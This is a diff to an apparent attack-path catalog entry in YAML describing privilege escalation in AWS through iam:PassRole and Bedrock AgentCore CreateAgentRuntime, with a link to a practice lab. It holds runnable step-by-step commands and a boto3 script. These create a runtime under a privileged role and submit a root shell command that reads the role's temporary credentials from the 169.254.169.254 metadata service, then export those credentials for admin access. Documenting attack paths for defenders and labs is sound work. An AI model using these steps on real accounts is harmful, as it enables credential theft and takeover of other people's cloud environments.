@@ -45,13 +45,26 @@ exploitationSteps:
     description: Set up session variables and confirm jq is installed
   - step: 2
     command: |
-      RUNTIME_ARN=$(aws bedrock-agentcore-control create-agent-runtime \
+      CREATE_OUTPUT=$(aws bedrock-agentcore-control create-agent-runtime \
         --agent-runtime-name atk_runtime \
         --role-arn $EXECUTION_ROLE \
         --agent-runtime-artifact "{\"containerConfiguration\":{\"containerUri\":\"$CONTAINER_URI\"}}" \
-        --network-configuration '{"networkMode":"PUBLIC"}' | jq -r .agentRuntimeArn)
+        --network-configuration '{"networkMode":"PUBLIC"}')
+      RUNTIME_ARN=$(echo $CREATE_OUTPUT | jq -r .agentRuntimeArn)
+      RUNTIME_ID=$(echo $CREATE_OUTPUT | jq -r .agentRuntimeId)
     description: Create a runtime with the privileged execution role. The call provisions the DEFAULT runtime endpoint and the workload identity, which is why CreateAgentRuntimeEndpoint and CreateWorkloadIdentity are required
   - step: 3
+    command: |
+      while true; do
+        STATUS=$(aws bedrock-agentcore-control get-agent-runtime \
+          --agent-runtime-id $RUNTIME_ID \
+          --query 'status' --output text)
+        echo "Status: $STATUS"
+        [ "$STATUS" = "READY" ] && break
+        sleep 15
+      done
+    description: Poll bedrock-agentcore:GetAgentRuntime until the runtime reaches READY. The microVM takes time to provision, and InvokeAgentRuntimeCommand errors out if called before the runtime is READY
+  - step: 4
     command: |
       cat << 'EOF' > "get_creds_from_runtime.py"
       import boto3, sys, uuid
@@ -59,7 +72,8 @@ exploitationSteps:
 
       command = """bash -c '
       TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
-      curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role
+      ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+      curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
       '"""
 
       response = client.invoke_agent_runtime_command(
@@ -72,8 +86,8 @@ exploitationSteps:
         if "contentDelta" in chunk and "stdout" in chunk["contentDelta"]:
           print(chunk["contentDelta"]["stdout"], end="")
       EOF
-    description: Create the python file that submits a root shell command reading the execution role credentials from MMDS
-  - step: 4
+    description: Create the python file that submits a root shell command. The command first requests an MMDS session token, then GETs the security-credentials path with no role name to discover the execution role's alias (the same two-step discovery pattern used against EC2 IMDS when the role name is unknown), then fetches the credentials for that discovered role name. boto3 is used directly because the AWS CLI does not expose an invoke-agent-runtime-command subcommand
+  - step: 5
     command: 'CREDS=$(python3 get_creds_from_runtime.py $RUNTIME_ARN $AWS_REGION)
 
       echo export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r ".AccessKeyId")
@@ -83,13 +97,13 @@ exploitationSteps:
       echo export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r ".Token")
 
       '
-    description: Run the python file using the $RUNTIME_ARN to extract the execution role credentials
-  - step: 5
-    command: 'export AWS_ACCESS_KEY_ID=<AccessKeyId from step 4>
+    description: Run the python file using the $RUNTIME_ARN to discover the execution role name and extract its credentials
+  - step: 6
+    command: 'export AWS_ACCESS_KEY_ID=<AccessKeyId from step 5>
 
-      export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 4>
+      export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 5>
 
-      export AWS_SESSION_TOKEN=<Token from step 4>
+      export AWS_SESSION_TOKEN=<Token from step 5>
 
       aws sts get-caller-identity
 
@@ -159,6 +173,12 @@ relatedPaths:
 - bedrock-005
 - ec2-001
 - sagemaker-001
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: privesc-one-hop/to-admin/iam-passrole+bedrockagentcore-createagentruntime
+    description: Deploy Terraform into your own AWS account to practice this attack path
 attackVisualization:
   nodes:
   - id: start
@@ -191,15 +211,16 @@ attackVisualization:
     type: payload
     color: '#99ccff'
     description: |
-      The submitted command reads the execution role credentials from MMDS and prints them, and AgentCore returns the output in the response stream so the attacker can use the credentials from any location.
+      The submitted command reads the execution role credentials from MMDS and prints them, and AgentCore returns the output in the response stream so the attacker can use the credentials from any location. Since the execution role's alias is not known in advance, the command first requests a session token, then GETs the security-credentials path with no role name to discover the role, then fetches the credentials for that discovered name -- the same two-step discovery pattern used against EC2 IMDS.
 
       Example command body invoked through InvokeAgentRuntimeCommand:
       ```bash
       TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
-      curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role
+      ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+      curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
       ```
 
-      This returns AccessKeyId, SecretAccessKey and Token, which the attacker can export and use until they expire.
+      This returns AccessKeyId, SecretAccessKey and Token, which the attacker can export and use until they expire. The command must be submitted through boto3's invoke_agent_runtime_command -- the AWS CLI does not expose an equivalent subcommand -- and only succeeds once the runtime has reached READY (confirmed via bedrock-agentcore:GetAgentRuntime).
   - id: admin
     label: Effective Administrator
     type: outcome
@@ -232,7 +253,7 @@ attackVisualization:
   - from: agent_runtime
     to: target_role
     label: Runtime assumes the execution role
-    description: AgentCore assumes the passed execution role and serves its temporary credentials on the MicroVM Metadata Service at http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role inside the runtime microVM.
+    description: AgentCore assumes the passed execution role and serves its temporary credentials on the MicroVM Metadata Service at http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name> inside the runtime microVM. The role name is not known in advance, so it must be discovered with a GET to the security-credentials path first. The runtime must also reach a READY state, pollable with bedrock-agentcore:GetAgentRuntime, before MMDS reliably serves credentials and before InvokeAgentRuntimeCommand will succeed.
   - from: target_role
     to: method_sdk_attack
     label: Option A
